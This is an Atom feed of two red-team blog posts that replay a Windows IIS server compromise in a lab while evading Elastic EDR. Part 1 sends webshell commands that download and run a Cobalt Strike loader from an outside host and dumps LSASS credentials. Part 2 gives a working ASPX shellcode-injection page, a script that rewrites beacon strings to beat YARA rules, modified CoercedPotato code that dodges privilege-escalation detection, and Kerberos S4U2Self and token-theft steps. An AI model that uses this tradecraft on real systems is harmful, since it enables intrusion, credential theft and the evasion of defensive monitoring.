<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://sokarepo.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://sokarepo.github.io//" rel="alternate" type="text/html" /><updated>2024-01-04T18:05:37+01:00</updated><id>https://sokarepo.github.io//feed.xml</id><title type="html">sokarepo</title><subtitle>soka offsec notes | Web, Active Directory and Maldev stuff</subtitle><author><name>soka</name></author><entry><title type="html">Increase your stealth capabilities - part 1</title><link href="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1.html" rel="alternate" type="text/html" title="Increase your stealth capabilities - part 1" /><published>2024-01-04T00:00:00+01:00</published><updated>2024-01-04T00:00:00+01:00</updated><id>https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1.html"><![CDATA[<p>In a recent assessment, my teammates and I were tasked to perform a web security review of several applications with the possibility to perform internal pentest if the opportunity came up.</p>

<p>On one of the application, we successfully uploaded a aspx webshell which executes Windows cmd.
The engagement didn’t require us to be stealthy and the goal of this blog post is to reproduce our what we did with Elastic EDR watching us.</p>

<h2 id="web-rce">Web RCE</h2>

<p>We downloaded our CobaltStrike loader and executed it</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://website.crash.lab/webshell.aspx <span class="nt">--data</span> <span class="s1">'70c1cc863a=powershell wget http://xxxx.com/load.exe -outfile C:\Windows\Temp\load.exe'</span>
<span class="o">&gt;</span> curl http://website.crash.lab/webshell.aspx <span class="nt">--data</span> <span class="s1">'70c1cc863a=C:\Windows\Temp\load.exe'</span>
</code></pre></div></div>

<p>And we got our beacon back
<br /></p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908164217.png" alt="Cobalt Strike beacon" />
<br /></p>

<p>If we look at the alerts in Elastic EDR, we can see that we were very noisy.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908151601.png" alt="Elastic EDR detections" />
<br /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Web Shell Detection: Script Process Child of Common Web Processes</code> because the IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code> spawned <code class="language-plaintext highlighter-rouge">cmd.exe</code></li>
  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Suspicious Microsoft IIS Worker Descendant</code> because the IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code> spawned <code class="language-plaintext highlighter-rouge">cmd.exe</code> that suggest the web server has been compromised</li>
  <li><code class="language-plaintext highlighter-rouge">Remote File Download via PowerShell</code> because of the <code class="language-plaintext highlighter-rouge">wget</code> Powershell command to download our loader</li>
  <li><code class="language-plaintext highlighter-rouge">Memory Threat Detection Alert: Windows.Trojan.CobaltStrike</code> because Elastic EDR Yara rules flagged our beacon in memory</li>
  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Network Module Loaded from Suspicious Unbacked Memory</code> - as our beacon is stored in unbacked memory, Elastic EDR caught an API call that came from this suspicious region</li>
</ul>

<p><br />
The next step of our exploitation was to escalate our privileges from Local Service Account to Local Administrator.</p>

<p>We can do it in two different ways:</p>
<ul>
  <li>abuse <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege to escalate to SYSTEM (we used this way during the engagement)</li>
  <li>abuse Kerberos <code class="language-plaintext highlighter-rouge">S4U2Self</code> to generate a Service Ticket for a domain user which has local administrator right</li>
</ul>

<p><br /></p>

<h2 id="eop---seimpersonateprivilege">EoP - SeImpersonatePrivilege</h2>

<p>We used <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> to exploit the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly /home/user/Tools/Windows/GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\load.exe"
</code></pre></div></div>

<p>And we got our SYSTEM beacon back.
<br />
<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231006103045.png" alt="SYSTEM beacon" />
<br /></p>

<p>The last action raised the following alerts:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Microsoft Common Language Runtime Loaded from Suspicious Memory</code> - because <code class="language-plaintext highlighter-rouge">CLR.dll</code> has been loaded by the post-exploit temporary process</li>
  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: AMSI or WLDP Bypass via Memory Patching</code> - the CobaltStrike AMSI patch has been flagged</li>
</ul>

<h2 id="lsass-dump">LSASS dump</h2>

<p>After we gained SYSTEM privileges, we launched the built-in mimikatz command to dump credentials from LSASS.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231009144233.png" alt="logonpasswords" />
<br /></p>

<p>Which raised alerts:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">LSASS Process Access via Windows API</code></li>
  <li><code class="language-plaintext highlighter-rouge">Memory Threat Detection Alert: Windows.Hacktool.Mimikatz</code></li>
  <li><code class="language-plaintext highlighter-rouge">LSASS Access Attempt from Unbacked Memory</code></li>
</ul>

<p><br />
<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231009160453.png" alt="logonpasswords detection" />
<br /></p>

<h2 id="conclusion">Conclusion</h2>

<p>As we can saw, there are plenty of opportunities to detect our actions during the different phase of the attack path:</p>
<ul>
  <li>execution of a webshell</li>
  <li>execution of an .NET assembly through execute-assembly</li>
  <li>LSASS dump</li>
</ul>

<p>In the <a href="/redteam/2024/01/04/increase-your-stealth-capabilities-part2.html">next part</a> I will go through each steps again but with detection in mind.</p>]]></content><author><name>soka</name></author><category term="redteam" /><summary type="html"><![CDATA[In a recent assessment, my teammates and I were tasked to perform a web security review of several applications with the possibility to perform internal pentest if the opportunity came up.]]></summary></entry><entry><title type="html">Increase your stealth capabilities - part 2</title><link href="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2.html" rel="alternate" type="text/html" title="Increase your stealth capabilities - part 2" /><published>2024-01-04T00:00:00+01:00</published><updated>2024-01-04T00:00:00+01:00</updated><id>https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2.html"><![CDATA[<p><b><u>Note:</u> This blog post is the second one of the series <i>Increase your stealth capabilities</i>, make sure to have read <a href="/redteam/2024/01/04/increase-your-stealth-capabilities-part1.html">the first part</a>.</b></p>

<h2 id="recap">Recap</h2>

<p>During an engagement my teammates and I compromised a Windows server by uploading a webshell then elevated our privilege to SYSTEM and extracted credentials stored in LSASS.
<br />
In Part 1, I replayed the scenario in a lab where an Elastic EDR agent is running and we noticed that a lot of detection raised up.
<br />
In this Part 2, I will show how we can increase our stealth capabilities by using open source tools and building our own.</p>

<p><br /></p>

<h2 id="cobalt-strike-modifications">Cobalt Strike modifications</h2>

<p>In order to evade Elastic EDR yara rules, I followed the following Fortra <a href="https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature">blog post</a>.</p>

<p>Yara rules are pretty easy to evade when you know them… Elastic EDR rules can be found <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">here</a>.</p>

<p>I used <a href="https://github.com/xforcered/BokuLoader">xforcered/BokuLoader</a> (October+ release) to increase evasion capabilities of the Cobalt Strike beacon.
This release contains call stack spoofing capabilities that bypass Elastic EDR rules based on call stack analysis. You can learn more about it <a href="https://dtsec.us/2023-09-15-StackSpoofin/">here</a>.</p>

<p>After the User-Defined Reflective Loader included in Cobalt Strike, I made the following changes to the <code class="language-plaintext highlighter-rouge">bokuloader.cna</code> to bypass Elastic EDR yara rules:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub boku_strrep {
	local('$beacon_dll');
	$beacon_dll = $1;
	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLo4d3r____");
	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "13367321236742382543232341241261363163151d");
	$beacon_dll = strrep($beacon_dll, "(admin)", "(2omin)");
	$beacon_dll = strrep($beacon_dll, "beacon", "b4con5");
	$beacon_dll = strrep($beacon_dll, "%s as %s\\%s: %d", "%s -&gt; %s\\%s: %d");
	$beacon_dll = strrep($beacon_dll, "%02d/%02d/%02d %02d:%02d:%02d", "%02d/%02d/%02d&gt;%02d:%02d:%02d");
	$beacon_dll = strrep($beacon_dll, "This program cannot be run in DOS mode", "13367321236742383543232341221261363163");
	println("DEBUG - change DOS stub");
	$beacon_dll = strrep($beacon_dll, "\x4D\x5A\x41\x52\x55\x48\x89\xE5", "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x90");
	return $beacon_dll;
}
</code></pre></div></div>

<p>At this point, Elastic EDR should not detect the Cobalt Strike Reflective DLL as <code class="language-plaintext highlighter-rouge">Windows.Trojan.CobaltStrike</code>.</p>

<p>However, Elastic EDR will still alert if malicious bahaviour is detected:</p>
<ul>
  <li>Access to LSASS process from unbacked memory</li>
  <li>DLL loading from unbacked memory</li>
  <li>…</li>
</ul>

<p>Now we have a stealthier beacon, we can start to compromise the Windows server.
<br /></p>

<h2 id="webshell">Webshell</h2>

<p>As the goal is to get a proper access to the Windows machine, I will try to get a CobaltStrike beacon without executing OS command.</p>

<p>To do so, I crafted a C# web page which will inject the Cobalt Strike beacon into the current IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code></p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="p">=</span><span class="s">"c#"</span><span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Diagnostics"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Threading.Tasks"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Runtime.InteropServices"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Collections.Generic"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Linq"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Text"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Runtime.InteropServices"</span> <span class="p">%&gt;</span>

<span class="p">&lt;</span><span class="n">script</span> <span class="n">runat</span><span class="p">=</span><span class="s">"server"</span><span class="p">&gt;</span>

    <span class="cm">/*
	    Flags and functions import
	    ...
    */</span>

    
    <span class="k">public</span> <span class="kt">string</span> <span class="nf">ServerSideFunction</span><span class="p">()</span>
    <span class="p">{</span>
       
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">REPLACE_ME</span><span class="p">]</span> <span class="p">{</span> <span class="n">REPLACE_ME</span> <span class="p">};</span>

        <span class="n">IntPtr</span> <span class="n">pHandle</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(-</span><span class="m">1</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"OpenProcess failed "</span> <span class="p">+</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">GetLastWin32Error</span><span class="p">();</span>
        <span class="n">IntPtr</span> <span class="n">addr</span> <span class="p">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">AllocationType</span><span class="p">.</span><span class="n">Commit</span><span class="p">,</span> <span class="n">AllocationProtect</span><span class="p">.</span><span class="n">PAGE_READONLY</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"VirtualAllocEx failed"</span><span class="p">;</span>
        
        <span class="kt">uint</span> <span class="n">lpflOldProtect</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">res</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>

        <span class="n">res</span> <span class="p">=</span> <span class="nf">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x00000004</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="p">==</span> <span class="k">false</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"VirtualProtectEx RW failed"</span><span class="p">;</span>
        <span class="n">IntPtr</span> <span class="n">sc</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">AllocHGlobal</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">sc</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"AllocHGlobal failed"</span><span class="p">;</span>
        <span class="nf">RtlZeroMemory</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>

        <span class="n">UInt32</span> <span class="n">getsize</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="n">NTSTATUS</span> <span class="n">ntstatus</span> <span class="p">=</span> <span class="nf">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">ref</span> <span class="n">getsize</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">getsize</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"NtWriteVirtualMemory failed"</span><span class="p">;</span>
        
        <span class="n">res</span> <span class="p">=</span> <span class="nf">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x00000020</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="p">==</span> <span class="k">false</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"VirtualProtectEx RX failed"</span><span class="p">;</span>
        <span class="n">IntPtr</span> <span class="n">Thread_id</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
        <span class="n">IntPtr</span> <span class="n">tHandle</span> <span class="p">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
            <span class="n">pHandle</span><span class="p">,</span> 
            <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> 
            <span class="m">0</span><span class="p">,</span> 
            <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="m">0xfff</span><span class="p">,</span>
            <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> 
            <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">CreationFlags</span><span class="p">.</span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span> 
            <span class="k">out</span> <span class="n">Thread_id</span><span class="p">);</span>

        <span class="nf">QueueUserAPC</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">tHandle</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
        <span class="nf">ResumeThread</span><span class="p">(</span><span class="n">tHandle</span><span class="p">);</span>
        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pHandle</span><span class="p">);</span>
        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">tHandle</span><span class="p">);</span>
	<span class="k">return</span> <span class="s">"OK"</span><span class="p">;</span>

    <span class="p">}</span>
<span class="p">&lt;/</span><span class="n">script</span><span class="p">&gt;</span>

<span class="p">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span> <span class="n">PUBLIC</span> <span class="s">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
    <span class="s">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="n">html</span> <span class="n">xmlns</span><span class="p">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="n">xml</span><span class="p">:</span><span class="n">lang</span><span class="p">=</span><span class="s">"en"</span> <span class="n">lang</span><span class="p">=</span><span class="s">"en"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="n">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="p">-</span><span class="n">equiv</span><span class="p">=</span><span class="s">"Content-Type"</span> <span class="n">content</span><span class="p">=</span><span class="s">"text/html; charset=windows-1252"</span> <span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">inline</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="n">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="n">body</span><span class="p">&gt;</span>
<span class="p">&lt;%</span> <span class="p">=</span><span class="nf">ServerSideFunction</span><span class="p">()</span> <span class="p">%&gt;</span>
<span class="p">&lt;/</span><span class="n">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="n">html</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>Which does:</p>

<ol>
  <li>Get an handle on the current process</li>
  <li>Allocate RW memory in the process</li>
  <li>Write the beacon to this memory region</li>
  <li>Change the memory permissions to RX</li>
  <li>Call the beacon through APC</li>
</ol>

<p>When the page is being called, we got our beacon back.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231126111229.png" alt="Cobalt Strike beacon" /></p>

<p><br />
And I got zero detection from Elastic EDR for this step.
<br /></p>

<h2 id="privilege-escalation">Privilege escalation</h2>

<p>Now we have a beacon as a local service account we may want to escalate our privilege to dump some credentials.</p>

<p>I’m aware of 2 ways to perform the privilege escalation:</p>
<ul>
  <li>abuse <code class="language-plaintext highlighter-rouge">SeImpersonateToken</code> privilege with a Potato family exploit</li>
  <li>abuse <code class="language-plaintext highlighter-rouge">S4U2Self</code> Kerberos to forge a Service Ticket on behalf of a domain user who has local admin right</li>
</ul>

<p>Both methods can be used:</p>
<ul>
  <li>Potato exploits trigger a SYSTEM call and impersonate the local account - this might be detected (<del>I don’t know if some AV/EDR have detection rules for this</del>I recently noticed Elastic EDR has a rule for this). This method works on both no domain joined and joined Windows machine.</li>
  <li>S4USelf method is very stealthy as it only uses Kerberos but it is not usable in a no domain-joined machine and we might need PSRemoting/WinRM to be enabled as we don’t want to use psexec/smbexec/wmiexec/… which will raise security alerts.</li>
</ul>

<p><br /></p>

<p>Actually there is an universal privilege escalation path when LDAP signature is not enforced on domain controllers (default configuration) but I will make a dedicated blog post on this one later.
<br /></p>

<h2 id="privilege-escalation---seimpersonateprivilege">Privilege escalation - SeImpersonatePrivilege</h2>

<p>Few months ago, <a href="https://github.com/Prepouce/CoercedPotato">Prepouce/CoercedPotato</a> was released. CoercedPotato is a C++ program which, like the other Potato exploits, spawn a named pipe (via a RPC interface) to receive a SYSTEM authentication and impersonate it. To coerce the SYSTEM auth, CoercedPotato use MS-EFSR and MS-RPRN functions.</p>

<p>As we don’t want to put and execute anything on the disk, I forked and “converted” CoercedPotato to a Reflective DLL <a href="https://github.com/sokaRepo/CoercedPotatoRDLL">sokaRepo/CoercedPotatoRDLL</a>. You can read about it in a previous <a href="/redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html" target="_blank">blog post</a>.</p>

<p><br />
When I tested the Reflective DLL, I had the surprise that Elastic EDR recently added a Malicious Bahaviour Detection rule that didn’t exist one or two months before… =)</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231126114713.png" alt="SeImpersonate detection" /></p>

<p>I though that the detection could be based on:</p>
<ul>
  <li>use of known “malicious” functions <code class="language-plaintext highlighter-rouge">CreateProcessAsUser</code>/<code class="language-plaintext highlighter-rouge">CreateProcessWithTokenW</code></li>
  <li>behavior: a process which runs as a local service spawns a process as SYSTEM</li>
</ul>

<p>If we look at what <code class="language-plaintext highlighter-rouge">CreateProcessAsUser</code> is doing in IDA:</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240102170711.png" alt="IDA" /></p>

<p>The function just forwards the arguments to <code class="language-plaintext highlighter-rouge">CreateProcessInternalW</code> from <code class="language-plaintext highlighter-rouge">KernelBase.dll</code>.
We can use it in the CoercedPotatoRDLL code:</p>

<pre><code class="language-C">typedef BOOL(WINAPI* fnCreateProcessInternalW)(
	HANDLE,
	LPCWSTR,
	LPWSTR,
	LPSECURITY_ATTRIBUTES,
	LPSECURITY_ATTRIBUTES,
	BOOL,
	DWORD,
	LPVOID,
	LPCWSTR,
	LPSTARTUPINFOW,
	LPPROCESS_INFORMATION
);

fnCreateProcessInternalW CreateProcessInternalW; 

CreateProcessInternalW = (fnCreateProcessInternalW)GetProcAddress(
										GetModuleHandle(L"kernelbase.dll"),
										"CreateProcessInternalW"
										); 

if (!CreateProcessInternalW(hSystemTokenDup,
							g_pwszProcessName,
							g_pwszCommandLine,
							NULL,
							NULL,
							g_bInteractWithConsole,
							dwCreationFlags,
							lpEnvironment,
							pwszCurrentDirectory,
							&amp;si,
							&amp;pi)) 
	wprintf(L"CreateProcessInternalW failed, error = %d\n", GetLastError());
else
	wprintf(L"CreateProcessInternalW seems OK");
</code></pre>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104135549.png" alt="CoercedPotatoRDLL beacon" /></p>

<p>With these modifications, Elastic EDR doesn’t alert about the privilege escalation anymore!</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240102172509.png" alt="new beacon" /></p>

<h2 id="privilege-escalation---s4u2self">Privilege escalation - S4U2Self</h2>

<p>Another way to do this is to abuse Kerberos itself.
As a local service account, when we authenticate with NTLM or Kerberos on another machine, the machine account is used <code class="language-plaintext highlighter-rouge">WEB1$</code>.
Therefore, the <a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">tgtdeleg trick</a> can be used to request a delegation TGT on behalf of the machine account.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908163233.png" alt="tgtdeleg" /></p>

<p>Once we have it, we can abuse Kerberos S4U2Self to ask for Service Ticket that impersonates a domain user with local admin right on the machine.</p>

<p>Unfortunately, I did not succeed to perform this step with Cobalt Strike only so I used a SOCKS proxy and Impacket on my Linux VM.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'ticket...'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> web1.kirbi
<span class="o">&gt;</span> ticketConverter.py web1.kirbi web1.ccache
<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5CCACHE</span><span class="o">=</span>web1.ccache
<span class="o">&gt;</span> git clone https://github.com/ThePorgs/impacket/
<span class="c"># install it</span>
<span class="c"># carreful with SPN name, try lower case and upper case for "HTTP"</span>
<span class="c"># I skipped the SOCKS proxy part here</span>
<span class="o">&gt;</span> getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s2">"sadmin"</span> <span class="nt">-altservice</span> <span class="s2">"HTTP/web1.crash.lab"</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.100.10.5 <span class="s1">'crash.lab/web1$'</span>
<span class="c"># use this to debug</span>
<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5_TRACE</span><span class="o">=</span>/dev/stdout
<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sadmin@HTTP_web1.crash.lab@CRASH.LAB.ccache
<span class="c"># update /etc/krb5.conf if GSS error  </span>
<span class="o">&gt;</span> evil-winrm.rb <span class="nt">-i</span> web1.crash.lab <span class="nt">-r</span> crash.lab
</code></pre></div></div>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908163828.png" alt="winrm" /></p>

<p>And popup a beacon as local administrator.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908164236.png" alt="beacon admin" /></p>

<p><br /></p>

<h2 id="lsass-credentials-dumping">LSASS credentials dumping</h2>

<p>That’s the tricky part… It’s seems that when <code class="language-plaintext highlighter-rouge">Credentials hardening</code> is enabled, it is not possible to open an handle on LSASS.exe</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104110004.png" alt="elasticEDR config" /></p>

<p>When we try to extract credentials with built-in Mimikatz command, it is not possible to access the process.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104105829.png" alt="LSASS denied" /></p>

<p>If we try to use <a href="https://github.com/fortra/nanodump">fortra/nanodump</a>, we have the same access issue.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104105810.png" alt="LSASS denied" /></p>

<p>If we turn off the <code class="language-plaintext highlighter-rouge">Credentials hardening</code>, we can successfully dump LSASS process without any alert from Elastic EDR.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104110221.png" alt="LSASS dump" /></p>

<p><br /></p>

<h2 id="alternatives-to-lsass-dump">Alternatives to LSASS dump</h2>

<p>Alternatively we can enumerate TGT inside LSA and look for any interesting users (<code class="language-plaintext highlighter-rouge">sadmin</code> is a good candidate in my lab).</p>

<p>To perform the bellow Keberos interactions, I use <a href="https://github.com/RalfHacker/Kerbeus-BOF">RalfHacker/Kerbeus-BOF</a> but <a href="https://github.com/wavvs/nanorobeus/">wavvs/nanorobeus</a> can also be used (Kerbeus-BOF is actually based on nanorobeus).</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104113937.png" alt="TGT enum" /></p>

<p>Here we dump all the TGT which belong to <code class="language-plaintext highlighter-rouge">sadmin</code> user.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115246.png" alt="TGT dump" /></p>

<p>In case we don’t have any TGT valid anymore, we can look for processes which run under our targeted user.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104133300.png" alt="beacon processes" /></p>

<p>Then steal the token of one of the processes.</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115541.png" alt="steal token" /></p>

<p>And use it to ask for a TGT</p>

<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115747.png" alt="TGT ask" />
<br />
<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104115909.png" alt="TGT enum" /></p>

<p>From here, we can act on behalf of <code class="language-plaintext highlighter-rouge">sadmin</code> user and try to move laterally in the network.
<br /></p>

<h2 id="conclusion">Conclusion</h2>

<p>In this second part we saw how we can increase our stealth and prevent Elastic EDR to spot us by using amazing open source tools such as BokuLoader.</p>

<p>To avoid executing .NET assembly in memory, we used C++ tool CoercedPotato and modify it to be a Reflective DLL in order to be able to load it in memory with Cobalt Strike.</p>

